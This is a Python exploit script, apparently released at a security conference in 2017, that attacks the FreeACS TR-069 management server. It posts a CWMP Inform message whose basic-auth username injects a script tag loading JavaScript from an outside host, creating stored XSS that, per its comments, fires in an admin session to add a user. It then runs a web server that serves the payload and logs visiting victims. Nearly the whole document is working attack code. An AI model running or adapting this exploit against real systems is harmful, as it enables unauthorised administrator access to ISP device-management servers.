#!/usr/bin/python
# worlds cheapest exploit - made by copypasting from stackoverflow.
# released at BSides Edinburgh.
# Exploits freeacs - freeacs.com
# TL;DR:
# - Persistent XSS via CWMP Notify message
# - XSS fires in admin session and adds a user
# HACK THE PLANET!
# Darren Martyn - @info_dox - 7th March 2017
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import requests

class myHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            print "{+} Got call from %s - you probably pwned one ;)" %(self.client_address[0])
            print "{+} Dumping headers for extra info...\n%s" %(self.headers)
            f = open("poc.js", "rb")
            poc = f.read()
            f.close()
            self.send_response(200)
            self.send_header('Content-type','application/javascript')
            self.end_headers()
            self.wfile.write(poc)
            return


def runserver(port):
    try:
        server = HTTPServer(('', port), myHandler)
        print 'Started httpserver on port ' , port
        server.serve_forever()

    except KeyboardInterrupt:
        print '^C received, shutting down the web server'
        server.socket.close()

print "{+} First we fire our XSS payload to the target device."
from requests.auth import HTTPBasicAuth
url = "http://192.168.1.7:8080/tr069/"
print "{+} Target is: %s" %(url)
xml = """\
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema/instance/" xmlns:xsd="http://www.w3.org/2001/XMLSchema/" xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<soap:Body>
<cwmp:Inform>
<DeviceId xsi:type="cwmp:DeviceIdStruct">
<Manufacturer xsi:type="xsd:string[64]">Serafeim</Manufacturer>
<OUI xsi:type="xsd:string[6]">123456</OUI>
<ProductClass xsi:type="xsd:string[64]">Testing</ProductClass>
<SerialNumber xsi:type="xsd:string[64]">12312131</SerialNumber>
</DeviceId>
<Event soap:arrayType="cwmp:EventStruct[1]">
<EventCode xsi:type="xsd:string[64]">6 CONNECTION REQUEST</EventCode>
</Event>
<MaxEnvelopes xsi:type="xsd:unsignedInt">10</MaxEnvelopes>
<CurrentTime xsi:type="xsd:dateTime">2017-03-05T16:29:48</CurrentTime>
<RetryCount xsi:type="xsd:unsignedInt">0</RetryCount>
<ParameterList soap:arrayType="cwmp:ParameterValueStruct[2]">
<ParameterValueStruct>
<Name xsi:type="xsd:string">InternetGatewayDevice.ManagementServer.URL</Name>
<Value xsi:type="xsd:string">https://127.0.0.1:80</Value>
</ParameterValueStruct>
<ParameterValueStruct>
<Name xsi:type="xsd:string">InternetGatewayDevice.ManagementServer.ConnectionRequestURL</Name>
<Value xsi:type="xsd:string">http://127.0.0.1:24582/CONNECT</Value>
</ParameterValueStruct>
</ParameterList>
</cwmp:Inform>
</soap:Body>
</soap:Envelope>"""
headers = {'SOAPAction': ''}
#auth=HTTPBasicAuth('"/><script>alert("xss ;)")</script>', 'pass')
auth=HTTPBasicAuth('"/><script src="//kitten/x.js"></script>', 'pass') # XXX: CHANGE THIS URL
r = requests.post(url=url, data=xml, headers=headers, auth=auth)
print r.headers
print r.status_code
print r.text
##
print "{+} Now we launch our XSS serving server ;)"
runserver(port=80)
